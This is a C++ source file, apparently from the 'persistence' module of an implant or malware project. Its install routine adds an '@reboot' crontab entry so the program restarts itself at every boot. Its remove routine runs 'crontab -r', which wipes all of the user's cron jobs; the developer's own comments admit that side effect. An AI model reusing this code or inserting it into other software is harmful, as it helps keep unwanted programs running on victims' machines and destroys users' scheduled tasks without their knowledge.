#include "modules/persistence/CronJob.hpp"
#include "utils/SystemUtils.hpp"

bool CronJobMethod::install() {
    std::string cronLine = "@reboot " + SystemUtils::GetProcessPath() + "\n";
    std::string command = "(crontab -l 2>/dev/null; echo \"" + cronLine + "\") | crontab -"; // crude way to go about it, don't know how to do it other way, so it'll stay for now

    return SystemUtils::ExecuteCommand(command);
}

bool CronJobMethod::remove() {
    return SystemUtils::ExecuteCommand("crontab -r"); // nukes all cronjobs, rethink to be more universal
}